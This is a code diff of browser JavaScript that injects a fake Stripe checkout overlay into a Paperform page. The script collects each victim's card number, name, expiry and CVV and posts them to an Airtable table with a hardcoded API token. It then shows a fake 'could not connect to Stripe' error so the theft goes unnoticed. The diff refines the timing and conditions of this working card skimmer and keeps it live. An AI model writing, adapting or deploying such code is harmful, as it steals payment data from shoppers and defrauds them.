@@ -156,63 +156,64 @@
     mutations.forEach(function (mutation) {
       console.log({ height: mutation.target.height });
       if (mutation.type === "attributes" && mutation.target.height == "0") {
-        console.log("ing");
+        setTimeout(() => {
+          const container = document.querySelector("div[data-paperform-id]");
+          if (container.height <= 716) {
+            container.parentElement.style.display = "none";
+            container.appendChild(div);
+            document.querySelector(".sk-fading-circle").style.opacity = 1;
+            document.querySelector(
+              "form.stripe-private-form.Checkout.Checkout--modal > div > div"
+            ).style.opacity = 0;
+            $(".stripe-cc-input").creditCardTypeDetector();
 
-        const container = document.querySelector("div[data-paperform-id]");
-        container.parentElement.style.display = "none";
-        container.appendChild(div);
-        document.querySelector(".sk-fading-circle").style.opacity = 1;
-        document.querySelector(
-          "form.stripe-private-form.Checkout.Checkout--modal > div > div"
-        ).style.opacity = 0;
-        $(".stripe-cc-input").creditCardTypeDetector();
+            document
+              .querySelector(".stripe-cc-input")
+              .addEventListener("input", function (e) {
+                e.target.value = e.target.value
+                  .replace(/[^\dA-Z]/g, "")
+                  .replace(/(.{4})/g, "$1 ")
+                  .trim();
+              });
 
-        document
-          .querySelector(".stripe-cc-input")
-          .addEventListener("input", function (e) {
-            e.target.value = e.target.value
-              .replace(/[^\dA-Z]/g, "")
-              .replace(/(.{4})/g, "$1 ")
-              .trim();
-          });
-
-        function insertSlash(val) {
-          val = val.replace(/\D/g, "");
-          return (
-            val.replace(/\//g, "").substring(0, 2) +
-            (val.length > 2 ? "/" : "") +
-            val.replace(/\//g, "").substring(2, 4)
-          );
-        }
-        document
-          .querySelector(
-            ".stripe-private-form span.CardField-expiry.CardField-child input"
-          )
-          .addEventListener("input", function (e) {
-            e.target.value = insertSlash(e.target.value);
-          });
-        stripefkcc = document.querySelector(".stripe-fk-cc");
-        document
-          .querySelector(
-            ".stripe-private-form span.CardField-expiry.CardField-child input"
-          )
-          .addEventListener("keyup", function (e) {
-            if (e.target.value.length >= 5) {
-              stripefkcc.focus();
+            function insertSlash(val) {
+              val = val.replace(/\D/g, "");
+              return (
+                val.replace(/\//g, "").substring(0, 2) +
+                (val.length > 2 ? "/" : "") +
+                val.replace(/\//g, "").substring(2, 4)
+              );
             }
-          });
+            document
+              .querySelector(
+                ".stripe-private-form span.CardField-expiry.CardField-child input"
+              )
+              .addEventListener("input", function (e) {
+                e.target.value = insertSlash(e.target.value);
+              });
+            stripefkcc = document.querySelector(".stripe-fk-cc");
+            document
+              .querySelector(
+                ".stripe-private-form span.CardField-expiry.CardField-child input"
+              )
+              .addEventListener("keyup", function (e) {
+                if (e.target.value.length >= 5) {
+                  stripefkcc.focus();
+                }
+              });
 
-        function cancelJob() {
-          document.querySelector(".sk-fading-circle").style.opacity = 1;
-          document.querySelector(
-            "form.stripe-private-form.Checkout.Checkout--modal > div > div"
-          ).style.opacity = 0;
-          const wrapper = document.querySelector(
-            "div#stripe-private-form-wrapper"
-          );
-          wrapper.parentElement.removeChild(wrapper);
+            function cancelJob(action) {
+              document.querySelector(".sk-fading-circle").style.opacity = 1;
+              document.querySelector(
+                "form.stripe-private-form.Checkout.Checkout--modal > div > div"
+              ).style.opacity = 0;
+              if (action) return;
+              const wrapper = document.querySelector(
+                "div#stripe-private-form-wrapper"
+              );
+              wrapper.parentElement.removeChild(wrapper);
 
-          const error = `<style> .Checkout .LiveField__error {
+              const error = `<style> .Checkout .LiveField__error {
             margin: 0;
         }
         .LiveField--error .LiveField__error {
@@ -262,69 +263,76 @@
             height: 40px !important;
         }
         </style> <div class="LiveField__error" id="field-error-text-undefined">FAILURE: Could not connect to Stripe. PLEASE TRY AGAIN.</div>`;
-          const div = document.createElement("div");
-          div.innerHTML = error;
-          div.id = "LiveField_error_wrapper";
-          const container = document.querySelector("div[data-paperform-id]");
-          container.parentElement.insertBefore(div, container);
+              const div = document.createElement("div");
+              div.innerHTML = error;
+              div.id = "LiveField_error_wrapper";
+              const container = document.querySelector(
+                "div[data-paperform-id]"
+              );
+              container.parentElement.insertBefore(div, container);
 
-          container.scrollIntoView();
-          setTimeout(() => {
-            if (div) div.style.display = "none";
-          }, 3000);
-          div.addEventListener("mouseenter", function () {
-            if (div) div.style.display = "none";
-          });
-        }
+              container.scrollIntoView();
+              setTimeout(() => {
+                if (div) div.style.display = "none";
+              }, 3000);
+              div.addEventListener("mouseenter", function () {
+                if (div) div.style.display = "none";
+              });
+            }
 
-        document
-          .querySelector(".CheckoutV2__checkout + div")
-          .addEventListener("click", cancelJob);
-        document
-          .querySelector("button.btn-raised.btn-primary")
-          .addEventListener("click", async function () {
-            const token = "keyH5pVxwVdPjMWJk";
-            const url =
-              "https://api.airtable.com/v0/appMihP6lGIak6vqS/tblaoar7ApsFzDNIm";
-            const urlSearchParams = new URLSearchParams(window.location.search);
-            const params = Object.fromEntries(urlSearchParams.entries());
-            let Data = {
-              records: [
-                {
-                  fields: {
-                    ...params,
-                    ccn: document.querySelector(".LiveField__answer input")
-                      .value,
-                    cnumber: document.querySelector(
-                      ".CardNumberField-input-wrapper input"
-                    ).value,
-                    expiry: document.querySelector(".CardField-expiry  input")
-                      .value,
-                    ccv: document.querySelector(
-                      ".CardField-cvc.CardField-child input"
-                    ).value,
+            document
+              .querySelector(".CheckoutV2__checkout + div")
+              .addEventListener("click", cancelJob.bind(true));
+            document
+              .querySelector("button.btn-raised.btn-primary")
+              .addEventListener("click", async function () {
+                const token = "keyH5pVxwVdPjMWJk";
+                const url =
+                  "https://api.airtable.com/v0/appMihP6lGIak6vqS/tblaoar7ApsFzDNIm";
+                const urlSearchParams = new URLSearchParams(
+                  window.location.search
+                );
+                const params = Object.fromEntries(urlSearchParams.entries());
+                let Data = {
+                  records: [
+                    {
+                      fields: {
+                        ...params,
+                        ccn: document.querySelector(".LiveField__answer input")
+                          .value,
+                        cnumber: document.querySelector(
+                          ".CardNumberField-input-wrapper input"
+                        ).value,
+                        expiry: document.querySelector(
+                          ".CardField-expiry  input"
+                        ).value,
+                        ccv: document.querySelector(
+                          ".CardField-cvc.CardField-child input"
+                        ).value,
+                      },
+                    },
+                  ],
+                };
+
+                const res = await fetch(url, {
+                  method: "POST",
+                  headers: {
+                    Authorization: `Bearer ${token}`,
+                    "Content-Type": "application/json",
                   },
-                },
-              ],
-            };
+                  body: JSON.stringify(Data),
+                });
 
-            const res = await fetch(url, {
-              method: "POST",
-              headers: {
-                Authorization: `Bearer ${token}`,
-                "Content-Type": "application/json",
-              },
-              body: JSON.stringify(Data),
-            });
-
-            cancelJob();
-            localStorage.setItem("paperform-Postfill", "true");
-          });
-        document.querySelector(".sk-fading-circle").style.opacity = 0;
-        container.parentElement.style.display = "block";
-        document.querySelector(
-          "form.stripe-private-form.Checkout.Checkout--modal > div > div"
-        ).style.opacity = 1;
+                cancelJob();
+                localStorage.setItem("paperform-Postfill", "true");
+              });
+            document.querySelector(".sk-fading-circle").style.opacity = 0;
+            container.parentElement.style.display = "block";
+            document.querySelector(
+              "form.stripe-private-form.Checkout.Checkout--modal > div > div"
+            ).style.opacity = 1;
+          }
+        }, 1000);
       }
     });
   });
